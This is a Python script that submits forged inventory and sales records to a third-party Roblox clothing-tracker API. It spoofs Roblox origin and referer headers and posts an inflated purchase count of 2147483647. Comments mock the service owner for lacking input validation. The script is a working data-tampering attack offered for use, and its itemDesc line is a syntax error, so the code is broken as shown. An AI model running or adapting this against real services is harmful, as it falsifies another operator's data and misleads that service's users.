import requests
import time
import json

myUserId = 0 # change this to your userid

assetid = 0
assetType = 11 # 12 is pants 11 is shirt
itemName = "There is no security"
itemDesc 'King cannot call changing the url to submit data to "adding security"'
itemProductId = 0 #this you can get from checking the page of the item but doesnt matter king doesnt check this.
creatorId = 0 # if creatorType is a Group then its groupid if it's user then its userid
itemPrice = 5 # king doesnt check this either
sales = 2147483647 # sales is something king cant check but i told a method to fix it
favs = 69 #this does nothing

this = [{"id":assetid,"itemType":"Asset","assetType":assetType,"name":itemName,"description":itemDesc,"productId":itemProductId,"genres":["All"],"itemStatus":[],"itemRestrictions":[],"creatorType":"Group","creatorTargetId":creatorId,"creatorName":"Core Enterprise","price":itemPrice,
         "purchaseCount":sales,"favoriteCount":favs}]
proxy=None

api_url = "https://clothing-tracker.herokuapp.com/api/saveInventory"
"""
So king calls changing the api url from https://sales-server.glitch.me to clothing-tracker.herokuapp.com "adding security" nice one.

Time spent on script: Roughly 5-10 mins had to do a bit of trial and error before finding right method to send data in.

"""




def submitData(userid):
    try:
        r = requests.post(api_url,headers={
             "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "access-control-request-headers": "access-control-allow-origin,content-type",
            "access-control-request-method": "POST",
            "origin": "https://www.roblox.com",
            "referer": "https://www.roblox.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
            "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*"
        },data=json.dumps(this),params={'userId':userid},proxies=proxy)
        if r.status_code == 200:
            print('Successfully updated your sales data!')
        if r.status_code == 429:
            time.sleep(15)
            return submitData(userid)
    except Exception as e:
        print(e)


submitData(myUserId)
